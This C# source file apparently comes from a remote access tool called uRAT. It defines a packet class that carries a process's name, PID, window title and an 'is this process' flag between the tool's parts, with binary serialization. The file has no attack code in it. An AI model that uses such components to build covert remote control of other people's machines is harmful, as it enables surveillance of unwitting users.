using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersPlugin.ProcessManager.Packets
{
    public class ProcessInformationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 5; }
        }

        public string ProcessName { get; set; }
        public int Pid { get; set; }
        public bool IsThis { get; set; }
        public string WindowName { get; set; }

        public ProcessInformationPacket()
        {
        }

        public ProcessInformationPacket(string processName)
        {
            ProcessName = processName;
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(ProcessName);
            bw.Write(Pid);
            bw.Write(IsThis);
            bw.Write(WindowName);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            br.ReadInt32();
            ProcessName = br.ReadString();
            Pid = br.ReadInt32();
            IsThis = br.ReadBoolean();
            WindowName = br.ReadString();
        }
    }
}
